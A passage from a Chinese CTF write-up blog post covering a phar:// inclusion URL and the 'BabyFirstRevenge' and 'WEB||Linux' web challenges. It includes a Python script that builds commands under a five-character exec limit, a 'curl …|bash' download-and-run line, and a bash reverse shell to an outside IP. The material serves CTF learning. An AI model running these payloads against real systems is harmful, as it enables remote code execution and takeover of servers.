+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:2080/flag.php?filename=phar://upload_file/kage.gif/test.txt</span><br></pre></td></tr></table></figure>
+<h2 id="BabyFirstRevenge"><a href="#BabyFirstRevenge" class="headerlink" title="BabyFirstRevenge"></a>BabyFirstRevenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = &apos;/var/www/html/sandbox/&apos;.md5(&quot;orange&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</span><br><span class="line">        exec($_GET[&apos;cmd&apos;]);</span><br><span class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</span><br><span class="line">        exec(&apos;/bin/rm -rf &apos; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>可以看到，本题允许我们执行任意代码，但是长度限制在5个以内。<br>这题网上一些wp总结的很详细了。<br><a href="https://www.jianshu.com/p/a77e956d9941" target="_blank" rel="noopener">BabyFirst Revenge复现</a>。</p>
+<p>第一步就是通过<code>&gt;</code>管道符以一定顺序创建文件，每个文件后面带有<code>\</code>代表一个payload语句块，然后通过<code>ls -t&gt;a</code>将文件名按时间排序输出到a文件，组成我们的paylaod语句，最后sh执行a文件达到命令执行。<br>命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.silky.fun|bash</span><br></pre></td></tr></table></figure></p>
+<p>第二步就是反弹shell，我是通过bash进行反弹。具体实现，就是将我们的反弹脚本放在自己的vps上，然后利用命令执行漏洞让目标机器执行我们的反弹脚本，连向我们的vps，最后拿到shell。<br>反弹shell如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/45.76.195.120/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>原理并不难，但是按老哥文章复现真的是坑挺多的。</p>
+<p>首先我们vps的ip每个点前数字不能是一样，因为会生成同样的文件名导致ip的不完整，不幸的是我的vps就是这样的，一度卡壳，最后通过注册域名解决。</p>
+<p>第二按网上的脚本，形成的payload后面会有没用的代码来中断shell的连接，最后我在payload添加&amp;sleep来阻断后面代码执行，成功实现复现。</p>
+<p>最后分享一下脚本吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    # generate `ls -t&gt;g` file</span><br><span class="line">    &apos;&gt;ls\\&apos;, </span><br><span class="line">    &apos;ls&gt;_&apos;, </span><br><span class="line">    &apos;&gt;\ \\&apos;, </span><br><span class="line">    &apos;&gt;-t\\&apos;, </span><br><span class="line">    &apos;&gt;\&gt;g&apos;, </span><br><span class="line">    &apos;ls&gt;&gt;_&apos;, </span><br><span class="line"></span><br><span class="line">    # generate `curl 45.76.195.120|bash`</span><br><span class="line">    # generate `curl www.silky.fun|bash`</span><br><span class="line">    &apos;&gt;\ \\&apos;,</span><br><span class="line">    &apos;&gt;p\\&apos;,</span><br><span class="line">    &apos;&gt;ee\\&apos;,</span><br><span class="line">    &apos;&gt;sl\\&apos;,</span><br><span class="line">    &apos;&gt;\&amp;\\&apos;,</span><br><span class="line">    &apos;&gt;sh\\&apos;, </span><br><span class="line">    &apos;&gt;ba\\&apos;, </span><br><span class="line">    &apos;&gt;\|\\&apos;,</span><br><span class="line">    &apos;&gt;n\\&apos;,</span><br><span class="line">    &apos;&gt;fu\\&apos;, </span><br><span class="line">    &apos;&gt;y.\\&apos;,</span><br><span class="line">    &apos;&gt;lk\\&apos;, </span><br><span class="line">    &apos;&gt;si\\&apos;, </span><br><span class="line">    &apos;&gt;w.\\&apos;, </span><br><span class="line">    &apos;&gt;ww\\&apos;,</span><br><span class="line">    &apos;&gt;\ \\&apos;, </span><br><span class="line">    &apos;&gt;rl\\&apos;, </span><br><span class="line">    &apos;&gt;cu\\&apos;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &apos;sh _&apos;, </span><br><span class="line">    &apos;sh g&apos;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://120.79.33.253:9003/?reset=1&apos;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;= 5 </span><br><span class="line">    r = requests.get(&apos;http://120.79.33.253:9003/?cmd=&apos; + quote(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>
+<h2 id="WEB-Linux"><a href="#WEB-Linux" class="headerlink" title="WEB||Linux"></a>WEB||Linux</h2><p>这题和最后一题Babyfirst是同一题的，只是限制条件放宽了。我是先做的最后一题，来做这题就很轻松了。</p>
+<p>题目说不用getshell就能做，那多没意思，渗透最刺激的就是getshell啦。</p>
+<p>还是按上题思路，但是这次就没必要写脚本了。<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:4080?dog3=&gt;fun\|bash</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;curl\ www.silky.\\</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;ls -t&gt;a</span><br><span class="line">http://206.189.214.99:4080?dog3=&gt;sh a</span><br></pre></td></tr></table></figure>
+<p>后台打开nc等着shell，拿到shell搜寻一番，尽然看到xss的源码，顺便也把xss也秒了。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最近有几个萌新问我安全怎么入门，包括我的一个高中好朋友，哈哈，越来越多小伙伴一起学习还是很开心的(～￣▽￣)～。。其实入门的东西，，道格平台和三叶草wiki已经写的很详细了，大家跟着上面学问题就不大啦，不过我还是要加一点补充，就是对于像ctf、漏洞之类的学习，不要以为看懂教程就会了，一定要自己动手复现一遍才算学到真本事。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/22/杂记/" rel="next" title="杂记">
+                <i class="fa fa-chevron-left"></i> 杂记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/touxiang.jpg"
+                alt="Kage" />
+            
+              <p class="site-author-name" itemprop="name">Kage</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET"><span class="nav-number">2.</span> <span class="nav-text">$_GET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST"><span class="nav-number">3.</span> <span class="nav-text">$_POST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#突破物理极限"><span class="nav-number">4.</span> <span class="nav-text">突破物理极限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#serialize"><span class="nav-number">5.</span> <span class="nav-text">serialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htmlspecialchars"><span class="nav-number">6.</span> <span class="nav-text">htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#机器人"><span class="nav-number">7.</span> <span class="nav-text">机器人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破拿flag"><span class="nav-number">8.</span> <span class="nav-text">爆破拿flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数字比较"><span class="nav-number">9.</span> <span class="nav-text">数字比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss1"><span class="nav-number">10.</span> <span class="nav-text">xss1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你能让他停下来吗"><span class="nav-number">11.</span> <span class="nav-text">你能让他停下来吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#欢迎加入道格小组"><span class="nav-number">12.</span> <span class="nav-text">欢迎加入道格小组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Firefox"><span class="nav-number">13.</span> <span class="nav-text">Firefox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP伪造"><span class="nav-number">14.</span> <span class="nav-text">IP伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass"><span class="nav-number">15.</span> <span class="nav-text">bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Match-it"><span class="nav-number">16.</span> <span class="nav-text">Match it</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wafupload"><span class="nav-number">17.</span> <span class="nav-text">wafupload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不认真的upload"><span class="nav-number">18.</span> <span class="nav-text">不认真的upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyFirstRevenge"><span class="nav-number">19.</span> <span class="nav-text">BabyFirstRevenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Linux"><span class="nav-number">20.</span> <span class="nav-text">WEB||Linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">21.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kage</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
